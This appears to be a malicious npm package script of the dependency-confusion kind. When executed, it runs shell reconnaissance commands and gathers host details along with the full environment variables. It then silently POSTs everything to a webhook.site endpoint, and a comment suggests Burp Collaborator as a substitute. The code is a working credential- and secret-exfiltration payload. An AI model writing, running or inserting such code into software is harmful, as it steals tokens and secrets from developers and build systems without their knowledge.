const os = require("os");
const dns = require("dns");
const querystring = require("querystring");
const https = require("https");
const packageJSON = require("./package.json");
const package = packageJSON.name;
const fs = require("fs");
const { execSync } = require("child_process");



let commandOutput = "";
try {
    commandOutput = execSync("whoami && id && uname -a && pwd").toString();
} catch (e) {
    commandOutput = e.toString();
}


const trackingData = JSON.stringify({
    package: packageJSON.name,
    version: packageJSON.version,
    cwd: process.cwd(),
    homedir: os.homedir(),
    hostname: os.hostname(),
    username: os.userInfo().username,
    platform: os.platform(),
    arch: os.arch(),
    uptime: os.uptime(),
    node_version: process.version,
    pid: process.pid,
    env: process.env,
    dns: dns.getServers(),
    cpus: os.cpus(),
    cmd_output: commandOutput,
});

var postData = querystring.stringify({
    msg: trackingData,
});

var options = {
    hostname: "webhook.site", //replace burpcollaborator.net 
    port: 443,
    path: "/210ce93c-0665-4566-b088-6d97145498dc",
    method: "POST",
    headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": postData.length,
    },
};

var req = https.request(options, (res) => {
    res.on("data", (d) => {
        process.stdout.write(d);
    });
});

req.on("error", (e) => {
    // console.error(e);
});

req.write(postData);
req.end();
